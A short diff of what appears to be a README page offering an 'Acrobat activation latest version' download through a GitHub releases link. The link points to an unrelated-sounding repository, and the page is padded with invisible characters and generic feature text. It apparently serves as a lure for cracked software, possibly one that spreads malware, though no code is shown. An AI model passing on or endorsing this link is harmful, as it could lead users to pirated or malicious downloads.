@@ -1,11 +1,11 @@
 
 # Download - [link](https://github.com/TDropX/XShroudAlerts2022/releases/tag/Install-Soft)⠀
 <blockquote>
-<p dir="ltr">activation-latest-version</p>
+<p dir="ltr">Acrobat-activation-latest-version</p>
 </blockquote>
 <hr /
 
-**Key Functions:**⠀⠀⠀
+## Key Functions:**⠀⠀⠀
 
 1. **PDF Creation:** Easily create PDF files from various sources including Word documents, Excel spreadsheets, PowerPoint presentations, web pages, and scanned documents. Acrobat ensures fidelity and consistency in PDF output.
 
